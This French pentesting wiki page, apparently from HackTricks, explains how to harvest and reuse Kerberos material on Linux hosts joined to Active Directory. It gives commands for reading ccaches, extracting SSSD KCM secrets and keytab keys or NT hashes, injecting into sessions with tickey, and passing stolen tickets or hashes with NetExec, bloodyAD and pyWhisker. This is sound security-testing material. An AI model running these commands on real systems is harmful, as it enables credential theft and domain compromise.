# Active Directory Linux

{{#include ../../banners/hacktricks-training.md}}

Une machine Linux peut également se trouver dans un environnement Active Directory.

Une machine Linux intégrée à un AD peut **stocker localement du matériel Kerberos** : des ccaches utilisateur, des keytabs de machine/service et des secrets gérés par SSSD. Ces artefacts peuvent généralement être réutilisés comme n’importe quel autre identifiant Kerberos. Pour en lire la plupart, vous devrez être l’utilisateur propriétaire du ticket ou **root** sur la machine.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Énumération

### Énumération d’AD depuis Linux

Si vous avez accès à un AD depuis Linux (ou depuis bash sous Windows), vous pouvez essayer [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) pour énumérer l’AD.

Vous pouvez également consulter la page suivante pour découvrir **d’autres façons d’énumérer un AD depuis Linux** :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA est une **alternative** open source à **Active Directory** de Microsoft Windows, principalement destinée aux environnements **Unix**. Il combine un **annuaire LDAP** complet avec un centre de distribution de clés **Kerberos** MIT pour une gestion similaire à celle d’Active Directory. Il utilise le **Certificate System** Dogtag pour la gestion des certificats CA et RA, et prend en charge l’authentification **multifacteur**, notamment par cartes à puce. SSSD est intégré aux processus d’authentification Unix.<sup>[[14]](#references)[[15]](#references)</sup> Pour en savoir plus, consultez :


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefacts d’un hôte joint au domaine

Avant de manipuler les tickets, identifiez **la méthode utilisée pour joindre l’hôte à l’AD** et **l’emplacement réel du matériel Kerberos**. Sur les hôtes Linux modernes, cette opération est généralement gérée par `realmd` + `adcli` + `sssd`, et pas seulement par des fichiers classiques dans `/tmp`.<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

Cela vous indique rapidement si l’hôte fait confiance à AD, si SSSD met en cache les identités ou les tickets, et si des **keytabs de machine/service** ou des **secrets KCM** peuvent être exploités.<sup>[[4]](#references)[[10]](#references)</sup>

Traitez `/var/lib/sss/db/cache_*.ldb` séparément des ccaches Kerberos et de `/var/lib/sss/secrets/secrets.ldb`. Les fichiers `cache_*.ldb` peuvent contenir des vérificateurs de mot de passe hors ligne lorsqu’un domaine a `cache_credentials = true` **et** que l’utilisateur s’est déjà authentifié sur cet hôte. Ils ne sont généralement lisibles qu’avec des privilèges élevés. Un fichier de cache ou un paramètre activé ne prouve pas à lui seul qu’un mot de passe utilisable et actuel est disponible ; vérifiez le paramètre effectif du domaine et les identités réellement mises en cache avant d’en tirer cette conclusion. Consultez la [documentation de Red Hat sur le cache des identifiants SSSD](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication). Pour une frontière d’identité distincte entre Linux et AD, le [mappage des noms Kerberos entre fournisseurs différents](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/) n’a d’importance que si un service accepte le ticket et mappe son principal vers le compte Unix concerné.

Sur un hôte disposant de `ksu`, un principal Kerberos valide peut accéder à un **compte cible local**, y compris root, uniquement si ce compte autorise le principal. [La documentation de MIT Kerberos](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html) décrit les fichiers `.k5login` et `.k5users` du répertoire personnel cible, ainsi que le mécanisme de repli du mappage de noms lorsqu’aucun des deux n’existe. `.k5users` peut également restreindre les commandes pour `ksu -e` ; le nom d’un fichier ne prouve pas à lui seul l’accès à un shell. Examinez le compte cible exact, le propriétaire et les permissions des fichiers, les entrées d’autorisation lisibles, les identifiants Kerberos disponibles et les règles de mappage effectives. Si le répertoire personnel de root est inaccessible, l’état de l’autorisation reste inconnu. L’énumération passive doit répertorier ces chemins et permissions sans demander de tickets ni exécuter `ksu`.

Une sauvegarde planifiée peut indirectement créer une frontière d’autorisation `.k5login`. Si un compte disposant de privilèges plus élevés copie récursivement dans son propre répertoire personnel un répertoire dans lequel un utilisateur moins privilégié peut écrire, vérifiez que la copie inclut les fichiers cachés, que le chemin de destination correspond au répertoire personnel effectif du compte et que le fichier obtenu a un propriétaire accepté par le service de connexion Kerberos. Par exemple, [la documentation de rsync](https://download.samba.org/pub/rsync/rsync.1.html) indique que `-a --no-owner` crée les nouveaux fichiers de destination avec comme propriétaire l’utilisateur qui les reçoit. [La documentation de MIT Kerberos](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html) explique comment un principal figurant dans le fichier `.k5login` de cet utilisateur peut autoriser l’accès. Vérifiez l’identité RunAs de la tâche planifiée, les droits d’écriture sur la source, les options rsync effectives, la connexion avec GSSAPI activé et la présence d’un ticket valide pour le principal indiqué ; un répertoire source accessible en écriture ou une commande rsync planifiée ne suffit pas à prouver que cette voie est exploitable.

Un keytab lisible nécessite également une vérification spécifique du principal. Un keytab contenant un principal dont le nom évoque l’administration ne prouve pas à lui seul l’existence de droits administratifs : la [politique `kadm5.acl` du KDC](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html) détermine les opérations autorisées pour les principaux. Vérifiez séparément le principal, l’ACL effective et l’autorisation locale `ksu` ou de connexion avant de considérer l’accès au keytab comme un moyen d’obtenir root. Le triage passif peut répertorier le chemin et les permissions du keytab sans utiliser ses clés ni contacter le KDC.

## Manipulation des tickets

### Pass The Ticket

Cette page présente différents endroits où vous pouvez **trouver des tickets Kerberos sur un hôte Linux**. La page suivante explique comment convertir ces formats de tickets CCache en Kirbi (le format requis sous Windows) et comment effectuer une attaque PTT :

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Pour les **méthodes de récupération de tickets propres à Linux** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.), consultez la page dédiée :

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Réutilisation de tickets CCACHE depuis /tmp

Les fichiers CCACHE sont des formats binaires qui servent à **stocker des identifiants Kerberos**. `FILE:/tmp/krb5cc_%{uid}` reste courant, mais les déploiements Linux modernes utilisent également `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` ou `KCM:%{uid}`. Vérifiez la variable d’environnement **`KRB5CCNAME`** et le paramètre `default_ccache_name` avant de supposer que les tickets se trouvent dans `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### Réutilisation des tickets CCACHE depuis le keyring

**Les tickets Kerberos stockés dans la mémoire d’un processus peuvent être extraits**, en particulier lorsque la protection ptrace de la machine est désactivée (`/proc/sys/kernel/yama/ptrace_scope`). Un outil utile à cette fin est disponible à l’adresse [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) ; il facilite l’extraction en s’injectant dans des sessions et en vidant les tickets dans `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Pour configurer et utiliser cet outil, suivez les étapes ci-dessous :

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

Cette procédure tentera de s’injecter dans différentes sessions. Elle indiquera sa réussite en stockant les tickets extraits dans `/tmp`, selon la convention de nommage `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Réutilisation de tickets CCACHE depuis SSSD KCM

SSSD conserve une copie de la base de données dans le chemin `/var/lib/sss/secrets/secrets.ldb`. La clé correspondante est stockée dans un fichier caché au chemin `/var/lib/sss/secrets/.secrets.mkey`. Par défaut, cette clé n’est lisible qu’avec les permissions **root**.<sup>[[4]](#references)</sup>

L’exécution de **`SSSDKCMExtractor`** avec les paramètres --database et --key analysera la base de données et **déchiffrera les secrets**.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

L’extracteur affiche les payloads JSON Kerberos bruts ; convertissez-les en cache de tickets utilisable ou dans un autre format de ticket avant les opérations pass-the-cache/pass-the-ticket.<sup>[[4]](#references)</sup>

### Triage rapide des keytabs

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### Extraire des comptes de /etc/krb5.keytab

Les clés des comptes de service, essentielles aux services fonctionnant avec les privilèges root, sont stockées en toute sécurité dans des fichiers **`/etc/krb5.keytab`**. Ces clés, qui s'apparentent aux mots de passe des services, doivent rester strictement confidentielles.<sup>[[5]](#references)</sup>

Pour examiner le contenu du fichier keytab, on peut utiliser **`klist`**. Sous Linux, `klist -k -K -e` affiche les principaux, les numéros de version des clés, les types de chiffrement et les clés brutes. Si le type de clé est **23 / RC4-HMAC**, sa valeur correspond également au **NT hash** de ce principal.<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Pour les utilisateurs Linux, **`KeyTabExtract`** permet d’extraire le hash RC4 HMAC, qui peut être utilisé pour réutiliser un hash NTLM. Notez que cela n’est utile que si le keytab contient encore du matériel **etype 23 / RC4-HMAC**. Dans les environnements **AES uniquement**, vous ne pourrez peut-être pas obtenir de hash NT réutilisable, mais vous pouvez tout de même vous authentifier directement avec le keytab via Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

Sur macOS, **`bifrost`** sert d’outil d’analyse des fichiers keytab.<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

En utilisant les informations extraites sur les comptes et les hash, il est possible d’établir des connexions aux serveurs à l’aide d’outils comme **`NetExec`**.<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### Réutiliser le compte machine de `/etc/krb5.keytab`

Sur les systèmes joints à l’aide de `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` contient généralement le **compte ordinateur** et un ou plusieurs **principals host/service**. Si vous avez les **droits root**, ne vous contentez pas de le dumper : utilisez l’un des principals listés par `klist -k` pour demander un TGT et agir en tant qu’hôte Linux lui-même.<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

C'est particulièrement utile lorsque **l'objet ordinateur** lui-même dispose de droits délégués dans AD ou lorsque l'hôte est autorisé à récupérer d'autres secrets, tels qu'un **gMSA**.<sup>[[13]](#references)</sup>

### Réutiliser du matériel Kerberos volé avec des outils AD conçus d'abord pour Linux

Une fois que vous disposez d'un `ccache` valide ou d'un keytab utilisable, vous pouvez interagir avec AD **directement depuis Linux** sans tout convertir au préalable aux formats Windows. De nombreux outils modernes acceptent nativement `KRB5CCNAME` / l'authentification Kerberos.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

This constitue un bon pont entre la **post-exploitation Linux** et l’**abus d’objets AD**. Pour les chemins d’abus au niveau des objets eux-mêmes, consultez :

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefacts Linux gMSA / Managed Service Account

Les déploiements Linux récents peuvent utiliser directement les **Managed Service Accounts** d’AD. En pratique, cela signifie qu’après avoir compromis un serveur Linux, vous pouvez trouver non seulement le keytab de l’hôte, mais aussi des **keytabs spécifiques aux services** générés à partir d’un gMSA. Les emplacements courants à inspecter sont `/etc/gmsad.conf`, les fichiers de configuration propres au déploiement et les fichiers `*.keytab` supplémentaires sous `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

Cela vous fournit une identité Kerberos réutilisable pour les SPN associés à ce gMSA **sans toucher à aucun endpoint Windows**.<sup>[[13]](#references)</sup> Pour l’abus de gMSA/dMSA **côté domaine** après avoir obtenu des privilèges supérieurs dans AD, consultez :

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II) : comment attaquer Kerberos ?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Accéder à AD avec un compte de service géré – Intégrer directement des systèmes RHEL à Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Variables d’environnement Kerberos – Documentation MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – Documentation MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757 : types de chiffrement Kerberos RC4-HMAC utilisés par Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Utiliser Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Découvrir et rejoindre des domaines d’identité | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Guide de l’utilisateur de bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [À propos | Documentation FreeIPA](https://www.freeipa.org/About.html)
- [15] [Notes de version de FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Documentation du noyau Linux](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – Documentation MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
